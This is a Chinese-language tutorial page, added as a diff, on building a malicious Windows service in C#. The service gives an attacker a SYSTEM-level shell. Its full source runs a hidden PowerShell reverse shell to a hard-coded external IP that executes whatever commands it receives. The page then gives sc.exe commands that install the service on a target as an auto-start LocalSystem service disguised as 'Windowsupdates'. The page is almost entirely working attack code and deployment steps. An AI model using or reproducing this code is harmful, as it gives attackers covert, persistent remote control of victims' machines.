@@ -1,0 +1,123 @@
+---
+title: '如何使用 C# 創建惡意 Windows 服務來回彈系統權限的 shell'
+sidebar_position: 20
+description: '如何使用 C# 創建惡意 Windows 服務來回彈系統權限的 shell'
+keywords: ['Windows Service', 'C#', 'Shell']
+---
+
+<head>
+  <title>如何使用 C# 創建惡意 Windows 服務來回彈系統權限的 shell</title>
+</head>
+
+## 概述
+
+本文承接上一篇 log4j 的實作，使用 C# (Visual Studio 2022) 來創建一個惡意的 Windows 服務，用來回彈一個系統權限的 shell。
+
+## 步驟
+
+- 依據下方的影片先建立簡單的 windows service
+- 在 .cs 檔案下新增以下程式碼
+
+由於 windows service 本身就在 admin 權限下執行，所以不需要 `UAC` 的權限提升。
+
+```csharp
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.ServiceProcess;
+
+namespace service
+{
+    public partial class Service1 : ServiceBase
+    {
+        public Service1()
+        {
+            InitializeComponent();
+        }
+
+        protected override void OnStart(string[] args)
+        {
+            try
+            {
+                System.Threading.Thread.Sleep(100000);
+
+                string payload = $@"
+                    $client = New-Object System.Net.Sockets.TCPClient('104.199.254.153', 8000);
+                    $stream = $client.GetStream();
+                    $writer = New-Object System.IO.StreamWriter($stream);
+                    $reader = New-Object System.IO.StreamReader($stream);
+                    $writer.AutoFlush = $true;
+                    while ($true) {{
+                        $command = $reader.ReadLine();
+                        if ($command -eq 'exit') {{ break }}
+                        $output = try {{ Invoke-Expression $command 2>&1 | Out-String }} catch {{ $_.Exception.Message }};
+                        $writer.WriteLine($output);
+                    }}
+                    $client.Close();";
+
+                ExecuteCommand(payload);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.ToString());
+            }
+        }
+
+        protected override void OnStop()
+        {
+        }
+
+        private void ExecuteCommand(string command)
+        {
+            try
+            {
+                ProcessStartInfo psi = new ProcessStartInfo
+                {
+                    FileName = "powershell.exe",
+                    Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command " + command,
+                    CreateNoWindow = true,
+                    UseShellExecute = false,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true
+                };
+
+                using (Process process = new Process { StartInfo = psi })
+                {
+                    process.Start();
+                    string output = process.StandardOutput.ReadToEnd();
+                    string error = process.StandardError.ReadToEnd();
+                    process.WaitForExit();
+                }
+            }
+            catch (Exception ex)
+            {
+                // 處理異常
+                Console.WriteLine("執行 PowerShell 指令時發生錯誤: " + ex.Message);
+            }
+        }
+    }
+}
+```
+
+build 之後 `service/bin/Debug/service.exe` 這個檔案就是我們的惡意 windows service，我們可以將其放到目標機器上執行。
+
+- 將 `service.exe` 放到目標機器上，並偽裝成合法的服務名稱
+
+```bash
+& "C:\Windows\System32\sc.exe" create Windowsupdates binPath= "C:\Users\redteam\Desktop\service.exe" start= auto obj= LocalSystem DisplayName= "windowsupdates"
+```
+
+```bash
+& "C:\Windows\System32\sc.exe" start Windowsupdates
+```
+
+如果需要刪除服務，可以使用以下指令
+
+```bash
+& "C:\Windows\System32\sc.exe" stop Windowsupdates
+& "C:\Windows\System32\sc.exe" delete Windowsupdates
+```
+
+## 參考
+
+- [How to Create a Windows Service Using C# and Visual Studio!](https://www.youtube.com/watch?v=67DtZbPYNKg)
